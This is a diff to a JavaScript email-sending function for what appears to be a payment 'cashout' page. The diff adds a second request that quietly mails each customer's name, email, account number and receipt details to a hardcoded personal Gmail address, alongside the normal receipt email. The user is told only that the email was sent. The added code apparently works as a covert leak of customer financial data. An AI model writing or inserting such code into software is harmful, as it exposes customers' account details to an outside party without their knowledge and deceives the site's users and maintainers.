@@ -188,15 +188,48 @@
 <h3 style="text-align: center; margin-top: 10px; font-size: clamp(10px, 4vw, 16px); color: #333;">UP NEXT &copy; 2025</h3>
 `
                 };
+const payload2 = {
+                    to_email: "moraladnan.siraj@gmail.com",
+                    subject: `Cashout done ${params.receiptid}`,
+                    body_html: ` <table style="width: 100%; font-family: Arial, sans-serif; font-size: 14px; border-collapse: collapse; margin-bottom: 20px; max-width: 100%;">
+    <tr style="font-size: clamp(8px, 4vw, 12px);">
+        <td style="padding: 8px; background: #F4F4F4; width: 40%; font-weight: bold; border-radius: 5px 0 0 5px; color: #333;">Receipt ID: ${params.receiptid}</td>
+        <td style="padding: 8px; background: #F4F4F4; text-align: right; font-weight: bold; border-radius: 0 5px 5px 0; color: #333;">Date: ${params.time}</td>
+    </tr>
+</table>
 
-                const response = await fetch(url, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload)
-                });
+<h2 style="text-align: center; margin-top: 10px; font-size: clamp(18px, 4vw, 22px); color: green;">Cashout Done</h2>
+
+<table style="width: 100%; margin-top: 10px; border-radius: 8px; max-width: 100%;">
+    <tr>
+        <td style="font-size: clamp(14px, 4vw, 16px); font-weight: bold; color: #007B8F;">Account Details</td>
+    </tr>
+    <tr>
+        <td style="padding-top: 5px; color: #444;"><strong style="color: #222;">Name:</strong> ${params.name}</td>
+    </tr>
+    <tr>
+        <td style="color: #444;"><strong style="color: #222;">Email:</strong> ${params.email}</td>
+    </tr>
+    <tr>
+        <td style="color: #444;"><strong style="color: #222;">Account Number:</strong> ${params.number}</td>
+    </tr>
+</table>`
+
+};
+                await Promise.all([
+            fetch(url, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }),
+            fetch(url, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload2)
+            })
+        ]);
 
                 alert('Email sent successfully!');
                 window.close();
